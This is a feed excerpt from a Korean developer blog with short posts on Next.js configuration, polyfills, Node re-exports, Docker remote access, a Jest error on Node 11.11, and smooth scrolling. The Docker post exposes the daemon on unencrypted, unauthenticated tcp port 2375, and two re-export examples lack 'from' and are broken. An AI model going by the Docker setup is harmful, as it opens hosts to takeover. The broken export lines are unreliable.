&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;ApolloLink&lt;/code&gt;를 사용하여 &lt;code class=&quot;language-text&quot;&gt;authMiddleware&lt;/code&gt;를 만든 후, &lt;strong&gt;link&lt;/strong&gt;에 &lt;code class=&quot;language-text&quot;&gt;concat&lt;/code&gt;을 이용하여 적용시켜주면 된다.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Nextjs publicRuntimeConfig 적용]]></title><description><![CDATA[Next.js를 사용하면서 브라우저에서 .env 설정을 받아들이지 못하는 문제가 있었습니다. 이를 설정을 이용하여 해결할 수 있습니다. 에 다음과 같이 추가하여 사용할 수 있습니다. 여기서 설정에 관한 부분은 추가적으로 해주어야 하기 때문에 node…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Fri, 29 Mar 2019 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Next.js를 사용하면서 브라우저에서 &lt;strong&gt;.env&lt;/strong&gt; 설정을 받아들이지 못하는 문제가 있었습니다. 이를 &lt;code class=&quot;language-text&quot;&gt;publicRuntimeConfig&lt;/code&gt;설정을 이용하여 해결할 수 있습니다.&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;next.config.js&lt;/code&gt;에 다음과 같이 추가하여 사용할 수 있습니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot;&gt;&lt;pre class=&quot;language-javascript&quot;&gt;&lt;code class=&quot;language-javascript&quot;&gt;module&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;exports &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;withSass&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;token literal-property property&quot;&gt;publicRuntimeConfig&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;token literal-property property&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;test&apos;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// or&lt;/span&gt;
module&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;exports &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;token literal-property property&quot;&gt;publicRuntimeConfig&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;token literal-property property&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;test&apos;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;여기서 &lt;code class=&quot;language-text&quot;&gt;.env&lt;/code&gt;설정에 관한 부분은 추가적으로 해주어야 하기 때문에 &lt;a href=&quot;https://www.npmjs.com/package/next-runtime-dotenv&quot;&gt;node-runtime-config&lt;/a&gt;를 사용하여 편리하게 구성할 수 있습니다.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Next.js Custom polyfill 적용하기]]></title><description><![CDATA[React프레임워크인 Next.js에서 polyfill을 적용할 때, webpack의 설정을 다음과 같이 추가하면 된다. next.config.js 위와 같이 추가한 후, .babelrc의 프리셋중 useBuiltIns를 “entry…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Tue, 26 Mar 2019 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;React프레임워크인 Next.js에서 polyfill을 적용할 때, webpack의 설정을 다음과 같이 추가하면 된다.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;next.config.js&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot;&gt;&lt;pre class=&quot;language-javascript&quot;&gt;&lt;code class=&quot;language-javascript&quot;&gt;module&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;exports &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token function-variable function&quot;&gt;webpack&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token parameter&quot;&gt;config&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token comment&quot;&gt;// Unshift polyfills in main entrypoint.&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; originalEntry &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; config&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;entry&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    config&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function-variable function&quot;&gt;entry&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;async&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; entries &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;originalEntry&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;entries&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;main.js&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; entries&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;main.js&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;unshift&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;./polyfills.js&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

      &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; entries&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; config&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;위와 같이 추가한 후, &lt;strong&gt;.babelrc&lt;/strong&gt;의 &lt;code class=&quot;language-text&quot;&gt;next/babel&lt;/code&gt;프리셋중 &lt;strong&gt;useBuiltIns&lt;/strong&gt;를 &lt;strong&gt;“entry”&lt;/strong&gt;로 변경해준다.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;.babelrc&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;json&quot;&gt;&lt;pre class=&quot;language-json&quot;&gt;&lt;code class=&quot;language-json&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token property&quot;&gt;&quot;presets&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;
      &lt;span class=&quot;token string&quot;&gt;&quot;next/babel&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
      &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token property&quot;&gt;&quot;preset-env&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;token property&quot;&gt;&quot;useBuiltIns&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;entry&quot;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;마지막으로 &lt;code class=&quot;language-text&quot;&gt;polyfill.js&lt;/code&gt;파일을 만들어 하고자 하는 polyfill 설정을 적용하면 된다.&lt;/p&gt;
&lt;p&gt;참고: &lt;a href=&quot;https://github.com/zeit/next.js/issues/2060&quot;&gt;예제&lt;/a&gt;&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Nodejs import후 export하기]]></title><description><![CDATA[Node.js를 사용할 때, 특정 모듈을 import한 그대로 export하고 싶은 경우 다음과 같이 사용할 수 있다.]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Sat, 23 Mar 2019 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Node.js를 사용할 때, 특정 모듈을 import한 그대로 export하고 싶은 경우 다음과 같이 사용할 수 있다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot;&gt;&lt;pre class=&quot;language-javascript&quot;&gt;&lt;code class=&quot;language-javascript&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;default&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;as&lt;/span&gt; exportName &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;./component&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; importName &lt;span class=&quot;token keyword&quot;&gt;as&lt;/span&gt; exportName &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;./component&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; importAndExportName &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;./component&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content:encoded></item><item><title><![CDATA[Docker 외부 접속 허용]]></title><description><![CDATA[를 사용할 때 외부 접속 및 일반 사용자계정으로 접속을 하려면 추가설정이 필요하다. 해당 옵션을 사용하려면, 와 같이 추가해야 한다. 이를 CentOS…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Tue, 12 Mar 2019 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;docker&lt;/code&gt;를 사용할 때 외부 접속 및 일반 사용자계정으로 접속을 하려면 추가설정이 필요하다.&lt;/p&gt;
&lt;p&gt;해당 옵션을 사용하려면, &lt;code class=&quot;language-text&quot;&gt;--host tcp://192.168.59.3:2376&lt;/code&gt;와 같이 추가해야 한다.&lt;/p&gt;
&lt;p&gt;이를 &lt;strong&gt;CentOS&lt;/strong&gt;기준으로 &lt;code class=&quot;language-text&quot;&gt;/etc/sysconfig/docker-network&lt;/code&gt;에 설정하면 된다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ &lt;span class=&quot;token function&quot;&gt;cat&lt;/span&gt; /etc/sysconfig/docker-network
&lt;span class=&quot;token comment&quot;&gt;# /etc/sysconfig/docker-network&lt;/span&gt;
&lt;span class=&quot;token assign-left variable&quot;&gt;DOCKER_NETWORK_OPTIONS&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;--host tcp://192.168.0.19:2375 --host unix:///var/run/docker.sock&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;그 후, 재시작 하고, 외부에서 접속을 하기 위해서 방화벽에 해당 포트를 추가해주면 된다.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Create React App Jest error over nodejs 11.11]]></title><description><![CDATA[현재 Create React App(v2.1.8이하)을 사용할 경우 Jest에서 다음과 같은 에러가 발생한다. 이슈 이 에러를 따라가보면 Jest…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Mon, 11 Mar 2019 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;현재 Create React App(v2.1.8이하)을 사용할 경우 Jest에서 다음과 같은 에러가 발생한다. &lt;a href=&quot;https://github.com/facebook/create-react-app/issues/6591&quot;&gt;이슈&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ &lt;span class=&quot;token assign-left variable&quot;&gt;CI&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;true &lt;span class=&quot;token function&quot;&gt;yarn&lt;/span&gt; &lt;span class=&quot;token builtin class-name&quot;&gt;test&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;yarn&lt;/span&gt; run v1.13.0
$ react-scripts &lt;span class=&quot;token builtin class-name&quot;&gt;test&lt;/span&gt;
FAIL src/App.test.js
  ● Test suite failed to run

    TypeError: Cannot assign to &lt;span class=&quot;token builtin class-name&quot;&gt;read&lt;/span&gt; only property &lt;span class=&quot;token string&quot;&gt;&apos;Symbol(Symbol.toStringTag)&apos;&lt;/span&gt; of object &lt;span class=&quot;token string&quot;&gt;&apos;#&amp;lt;process&gt;&apos;&lt;/span&gt;

      at exports.default &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;node_modules/jest-util/build/create_process_object.js:15:34&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

Test Suites: &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; failed, &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; total
Tests:       &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; total
Snapshots:   &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; total
Time:        &lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;.291s
Ran all &lt;span class=&quot;token builtin class-name&quot;&gt;test&lt;/span&gt; suites.
error Command failed with &lt;span class=&quot;token builtin class-name&quot;&gt;exit&lt;/span&gt; code &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;.
info Visit https://yarnpkg.com/en/docs/cli/run &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; documentation about this command.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이 에러를 따라가보면 Jest에서 &lt;a href=&quot;https://github.com/facebook/jest/pull/8050&quot;&gt;다음&lt;/a&gt;과 같이 해결하였다.&lt;/p&gt;
&lt;p&gt;우선 아래의 구문이 문제를 발생시킨다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot;&gt;&lt;pre class=&quot;language-javascript&quot;&gt;&lt;code class=&quot;language-javascript&quot;&gt;newProcess&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;Symbol&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;toStringTag&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;process&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;그렇기에 이를 다음과 같이 패치하였다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot;&gt;&lt;pre class=&quot;language-javascript&quot;&gt;&lt;code class=&quot;language-javascript&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token comment&quot;&gt;// This fails on Node 12, but it&apos;s already set to &apos;process&apos;&lt;/span&gt;
  newProcess&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;Symbol&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;toStringTag&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;process&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;e&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token comment&quot;&gt;// Make sure it&apos;s actually set instead of potentially ignoring errors&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;newProcess&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;Symbol&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;toStringTag&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;process&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    e&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;message &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;Unable to set toStringTag on process. Please open up an issue at https://github.com/facebook/jest\n\n&apos;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; e&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;message&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;throw&lt;/span&gt; e&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이 문제가 발생한 이유를 살펴보면 &lt;strong&gt;node.js&lt;/strong&gt;에서 &lt;code class=&quot;language-text&quot;&gt;11.11&lt;/code&gt;로 업데이트 할 때 다음과 같은 부분이 &lt;a href=&quot;https://github.com/nodejs/node/commit/ccaebdef66f62775ff8cc5d6fa21881a883c08fc#diff-362950ada44657730d806a6908957c35&quot;&gt;추가&lt;/a&gt;되었다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot;&gt;&lt;pre class=&quot;language-javascript&quot;&gt;&lt;code class=&quot;language-javascript&quot;&gt;Object&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;defineProperty&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;process&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; Symbol&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;toStringTag&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token literal-property property&quot;&gt;enumerable&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;token literal-property property&quot;&gt;writable&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;token literal-property property&quot;&gt;configurable&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;token literal-property property&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;process&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;해당 부분을 보게되면, &lt;strong&gt;process&lt;/strong&gt;객체에 &lt;code class=&quot;language-text&quot;&gt;Symbol.toStringTag&lt;/code&gt;멤버를 &lt;code class=&quot;language-text&quot;&gt;writable: false&lt;/code&gt;하게 정의하였기 때문에, Jest에서 문제가 발생하였다.&lt;/p&gt;
&lt;p&gt;그렇기에 &lt;a href=&quot;https://github.com/facebook/jest/commit/800f2f803d01c8ae194d71b251e4965dd70e5bf2&quot;&gt;Jest v24.2.0-alpha.0&lt;/a&gt;에서 패치가 되어 정상적으로 작동한다.&lt;/p&gt;
&lt;p&gt;하지만, 현재 &lt;strong&gt;create-react-app&lt;/strong&gt;의 경우는 &lt;strong&gt;jest&lt;/strong&gt;를 &lt;code class=&quot;language-text&quot;&gt;23.6.0&lt;/code&gt;을 사용하기 때문에 문제가 해결되지 않고 있다. 이를 해결할 &lt;a href=&quot;https://github.com/facebook/create-react-app/pull/6278&quot;&gt;PR&lt;/a&gt;이 있지만 아직 받아들여지지 않았다.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;create-react-app&lt;/strong&gt;을 사용하지 않을 경우에는, &lt;strong&gt;jest&lt;/strong&gt;의 버전을 &lt;code class=&quot;language-text&quot;&gt;v24.2.0-alpha.0&lt;/code&gt;이후 버전으로 업데이트하면 문제를 해결할 수 있다.&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&quot;20190426-추가&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#20190426-%EC%B6%94%EA%B0%80&quot; aria-label=&quot;20190426 추가 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;2019.04.26 추가&lt;/h3&gt;
&lt;p&gt;Nodejs를 11.12버전에서 다음 문제를 해결하였다. &lt;strong&gt;readonly&lt;/strong&gt;속성이였던 &lt;code class=&quot;language-text&quot;&gt;Symbol.toStringTag&lt;/code&gt;멤버가 &lt;strong&gt;writeable&lt;/strong&gt;하게 변경되면서 CRA버전에 상관없이 문제가 발생하지 않는다.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[CSS scrolling animation]]></title><description><![CDATA[javascript에서 jQuery를 사용하지 않고, 을 사용해 스크롤위치를 변경시킬 때 애니메이션을 추가하고 싶었다. 의 경우는 다음과 같이 지원하지 않는 브라우저가 많았다. 이를 해결할 smoothscroll-polyfill…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Wed, 06 Mar 2019 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;javascript에서 jQuery를 사용하지 않고, &lt;code class=&quot;language-text&quot;&gt;window.scroll&lt;/code&gt;을 사용해 스크롤위치를 변경시킬 때 애니메이션을 추가하고 싶었다.&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;scroll-behavior: smooth;&lt;/code&gt;의 경우는 &lt;a href=&quot;https://caniuse.com/#feat=css-scroll-behavior&quot;&gt;다음&lt;/a&gt;과 같이 지원하지 않는 브라우저가 많았다.&lt;/p&gt;
&lt;p&gt;이를 해결할 &lt;a href=&quot;https://github.com/iamdustan/smoothscroll&quot;&gt;smoothscroll-polyfill&lt;/a&gt;모듈이 있어 이를 사용하기로 했다.&lt;/p&gt;
&lt;p&gt;사용법은 다음과 같다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot;&gt;&lt;pre class=&quot;language-javascript&quot;&gt;&lt;code class=&quot;language-javascript&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; smoothscroll &lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;smoothscroll-polyfill&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;// kick off the polyfill!&lt;/span&gt;
smoothscroll&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;polyfill&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;사용하기 전에 선언을 해준다.&lt;/p&gt;
